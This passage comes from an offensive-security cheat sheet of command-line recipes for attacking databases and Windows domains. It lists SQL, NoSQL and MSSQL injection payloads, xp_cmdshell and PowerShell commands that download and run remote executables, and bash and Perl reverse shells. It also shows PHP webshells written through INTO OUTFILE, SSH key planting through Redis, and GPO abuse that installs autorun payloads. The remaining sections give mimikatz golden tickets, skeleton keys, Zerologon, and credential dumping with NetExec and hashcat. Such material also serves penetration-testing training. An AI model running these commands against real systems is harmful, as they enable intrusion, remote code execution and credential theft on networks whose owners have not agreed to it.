```c
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

##### xp_cmdshell

```c
SQL> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'; // current satate if 0 xp_cmdshell is disable
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC sp_configure 'Show Advanced Options', 1; 
SQL> RECONFIGURE; 
SQL> EXEC sp_configure 'xp_cmdshell', 1; 
SQL> RECONFIGURE;
SQL> EXEC xp_cmdshell 'dir';
```

```c
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

```c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

```c
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

#### MySQL

```c
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
mysql -u USER -p DATA_BASE_NAME -P PORT --skip-ssl
```

```c
mysql> STATUS;
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT version();
mysql> SELECT system_user();
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```

Crack mysql password

```c
hashcat -m 7400 -a 0 hash_sql.txt /usr/share/wordlists/rockyou.txt
```

##### Update User Password

```c
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
```

##### Drop a Shell

```c
mysql> \! /bin/sh
```

##### Insert Code to get executed

```c
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

##### Write SSH Key into authorized_keys2 file

```c
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

#### NoSQL Injection

```c
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

#### PostgreSQL

```c
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

##### Common Commands

```c
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT * FROM users;    // select everything from users table
<DATABASE>=# SHOW rds.extensions;    // list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
```

##### Postgres Remote Code Execution

```c
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

correc commandos pero del usuario de la shell

```c
\! id
```

#### Redis

```c
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

##### Enter own SSH Key

```c
redis-cli -h <RHOST>
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

#### SQL Injection

##### Master List

```c
';#---              // insert everywhere! Shoutout to xsudoxx!
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

##### Authentication Bypass

```c
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

#### Common Injections

##### MySQL & MariaDB

###### Get Number of Columns

```c
-1 order by 3;#
```

###### Get Version

```c
-1 union select 1,2,version();#
```

###### Get Database Name

```c
-1 union select 1,2,database();#
```

###### Get Table Name

```c
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
```

###### Get Column Name

```c
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

###### Read a File

```c
SELECT LOAD_FILE('/etc/passwd')
```

###### Dump Data

```c
-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
```

###### Create Webshell

```c
LOAD_FILE('/etc/httpd/conf/httpd.conf')
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
```

or

```c
LOAD_FILE('/etc/httpd/conf/httpd.conf')
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

##### MSSQL

###### Authentication Bypass

```c
' or 1=1--
```

###### Get Version with Time-Based Injection

```c
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

###### Enable xp_cmdshell

```c
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

###### Remote Code Execution (RCE)

```c
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
```

##### Orcale SQL

###### Authentication Bypass

```c
' or 1=1--
```

###### Get Number of Columns

```c
' order by 3--
```

###### Get Table Name

```c
' union select null,table_name,null from all_tables--
```

###### Get Column Name

```c
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
```

###### Dump Data

```c
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

##### SQLite

###### Extracting Table Names

```c
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

###### Extracting User Table

```c
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

##### Error-based SQL Injection (SQLi)

```c
<USERNAME>' OR 1=1 -- //
```

Results in:

```c
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```

```c
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

##### UNION-based SQL Injection (SQLi)

###### Manual Injection Steps

```c
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

```c
' ORDER BY 1-- //
```

```c
%' UNION SELECT database(), user(), @@version, null, null -- //
```

```c
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```c
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```

```c
' UNION SELECT null, username, password, description, null FROM users -- //
```

##### Blind SQL Injection (SQLi)

```c
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

```c
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

#### SQL Truncation Attack

```c
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
```

#### sqlite3

```c
sqlite3 <FILE>.db
```

```c
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

#### sqsh

```c
sqsh -S <RHOST> -U <USERNAME>
sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
```

##### List Files and Folders with xp_dirtree

```c
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

### Password Attacks

## DonPAPI

```c
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
DonPAPI -local_auth <USERNAME>@<RHOST>
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>
DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

#### fcrack

```c
fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
```

#### Group Policy Preferences (GPP)

##### gpp-decrypt

```c
python3 gpp-decrypt.py -f Groups.xml
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

#### Modify Existing Group Policy

Search for CreateChild, WriteProperty or GenericWrite. Obtain the ObjectDN

```c
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } 
```

Obtain the group by the SecurityIdentifier

```c
powershell ConvertFrom-SID <SecurityIdentifier>
```

```c
powershell Get-DomainGPO -Identity "<ObjectDN>" | select displayName, gpcFileSysPath
```

Now optain the distinguishedname or OU (OU=Workstations,DC=dev,DC=cyberbotic,DC=io)                          

```c
powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
```

Get the computers affected (computers in an OU) 

```c
powershell Get-DomainComputer -SearchBase "<distinguishedname_or_OU>" | select dnsHostName
```

modify the associated files directly in SYSVOL (the gpcFileSysPath)

```c
 ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<ObjectDN>}
```

Find this software share using PowerView

```c
Find-DomainShare -CheckShareAccess
```

Put a startup script in SYSVOL that will be executed each time an effected computer starts 

```c
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\<SOFTWARE_SHARE>\<PAYLOAD>.exe" --GPOName "Vulnerable GPO"
```

Access the affected computer on cmd

```c
gpupdate /force  // and then restart the pc
```

##### Create & Link a GPO

With powerview get groups affected

```c
powershell Get-DomainObjectAcl -Identity "<CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

Find link a GPO to an OU

```c
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
```

Obtain the group by the SecurityIdentifier

```c
powershell ConvertFrom-SID <SecurityIdentifier>
```

Check if PowerShell RSAT modules are installed

```c
powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

Use the New-GPO cmdlet to create and link a new GPO.

```c
powershell New-GPO -Name "Evil GPO"
```

Add an HKLM autorun key to the registry

```c
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\<PAYLOAD>.exe" -Type ExpandString
```

Apply the GPO to the target OU.

```c
powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
```

#### hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

```c
hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt // Crack NTL hashes
```

```c
hashcat --example-hashes
hashcat --help | grep -i "ntlm"
```

```c
hashcat --identify --user <FILE>
```

```c
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
```

##### Custom Rules

> https://hashcat.net/wiki/doku.php?id=rule_based_attack

###### Add a 1 to each Password

```c
echo \$1 > <FILE>.rule
```

###### Capitalize first character

```c
$1
c
```

###### Add nothing, a 1 or a ! to an existing Wordlist

```c
:
$1
$!
```

###### Rule for upper case Letter, numerical Value and special Character

- $1 > appends a "1"
- $2 > appends a "2"
- $3 > appends a "3"
- c > Capitalize the first character and lower case the rest

```c
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

###### Rule Preview

```c
hashcat -r <FILE>.rule --stdout <FILE>.txt
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule \\NTLM hashses
```

```c
cat add-year.rule
$2$0$2$0
```

##### Cracking ASPREPRoast Password File

```c
hashcat -m 18200 -a 0 <FILE> <FILE>
```

##### Cracking Kerberoasting Password File

```c
hashcat -m 13100 --force <FILE> <FILE>
john --format=krb5tgs --wordlist=wordlist SERVICE
```

##### Bruteforce based on the Pattern

```c
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

##### Generate Password Candidates: Wordlist + Pattern

```c
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
```

##### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

###### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

##### Crack with hashcat

```c
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
```

##### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

##### Cracking with OneRuleToRuleThemAll.rule

```c
hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

#### Hydra

```c
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
hydra -l USER -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://IP   //SSH Attack with user
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4
hydra -l USER -P wordlist  IP -t 4 ssh -V
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "PASSWORD" rdp://IP  //RDP Attack
```

```c
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY
```

```c
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
hydra -l user -P /usr/share/wordlists/rockyou.txt IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hydra -I -V -P "$WORDLIST" -t 1 "http-get://IP:PORT/:A=BASIC:F=401" //Basic authentication with base64
```

#### John

```c
keepass2john <FILE>
ssh2john id_rsa > <FILE>
zip2john <FILE> > <FILE>
john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
john <FILE> --rules --wordlist=/PATH/TO/WORDLIST/<WORDLIST
john --show <FILE>
hashcat -m 13600 zip.hash
```

#### Kerbrute

##### User Enumeration

```c
./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

##### Password Spray

```c
./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

#### LaZagne

```c
laZagne.exe all
```

#### mimikatz

##### Common Commands

```c
privilege::debug
token::elevate
token::revert
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
```

##### Dump Hashes

```c
.\mimikatz.exe
privilege::debug
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

##### Dump  Kerberos encryption keys of currently logged on users

```c
sekurlsa::ekeys
```

##### Security Account Manager (SAM) database dumo the NTLM hashes of local accounts only

```c
lsadump::sam
```

##### Dump Domain Cached Credentials (DCC)

```c
lsadump::cache
```

##### Pass the Ticket

```c
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

##### Forging Golden Ticket

```c
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
misc::cmd
klist
dir \\<RHOST>\admin$
```

##### Golden ticket for Trust Direction between two Domain Controllers

Verify domain trust
```c
PowerView.ps1
Get-ADTrust -Filter *
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```
###### Obtain DomainSID of the Second domain
```c
Get-DomainSID
mimikatz.exe ->  lsadump::trust
Current domain: SID
Domain second (trust domain): SID
Get-DomainGroup -Domain DOMAIN -Identity "Enterprise Admins" 
```
Add a -519
Enterprise_Admins_SID-519

###### Dump hashes especif to get KRBTGT 

```c
lsadump::dcsync /user:sub\krbtgt
lsadump::dcsync /all /csv
netexec smb IP -u administrator -H HASH --ntds --users
```

###### Create the golden ticket

```c
kerberos::golden /user:Administrator /domain:child.domain /sid:Child_SID_Enterprise_Admins_SID /krbtgt:NTLM_HASH /sids:Parent_Enterprise_Admins_SID-519
```

Load the golden ticket

```c
kerberos::ptt ticket.kirbi
```

Check the current ticket is the same as the generated one 

```c
klist
```

Connect to DC01

```c
Enter-PSSession DC01
```
##### Other option for Domain Trus
https://offensive.run/winecosystem/6trust/README.html 

```c
./mimikatz.exe "lsadump::trust /patch" "exit" //retrieve the rc4_hmac_nt value of one of the “CHILD.TARGET.COM -> TARGET.COM
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:$SRC_DOMAIN /sid:$SRC_SID /sids:$DST_SID /rc4:$KRBTGT_RC4 /service:krbtgt /target:$DST_DOMAIN /ticket:golden.kirbi" exit
.\Rubeus.exe asktgs /ticket:golden.kirbi /dc:"$DST_HOSTNAME.$DST_DOMAIN" /service:"CIFS/$DST_HOSTNAME.$DST_DOMAIN" /nowrap /ptt

copy rever32.exe '\\DC01.TARGET.COM\ADMIN$\rever32.exe'
sc.exe \\DC01.TARGET.COM create pototo binPath="c:\Windows\rever32.exe"
sc.exe \\DC01.TARGET.COM start pototo
```

##### Skeleton Key

```c
privilege::debug
misc::skeleton
net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

##### Zerologon

```c
"lsadump::zerologon /target:IP /account:DC_NAME$ /exploit" exit //exploit
"lsadump::dcsync /domain:DOMAIN_NAME.yzx /user:administrator /authuser:DC_NAME$ /authdomain:main /authpassword:"" /authntlm" exit
```

#### NetExec

```c
netexec smb <RHOST> -u '' -p '' --shares
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
netexec ldap <RHOST> -u '' -p '' --asreproast
netexec ldap <RHOST> -u '' -p '' -M -user-desc
netexec ldap <RHOST> -u '' -p '' -M get-desc-users
netexec ldap <RHOST> -u '' -p '' -M ldap-checker
netexec ldap <RHOST> -u '' -p '' -M veeam
netexec ldap <RHOST> -u '' -p '' -M maq
netexec ldap <RHOST> -u '' -p '' -M adcs
netexec ldap <RHOST> -u '' -p '' -M zerologon
netexec ldap <RHOST> -u '' -p '' -M petitpotam
netexec ldap <RHOST> -u '' -p '' -M nopac
netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
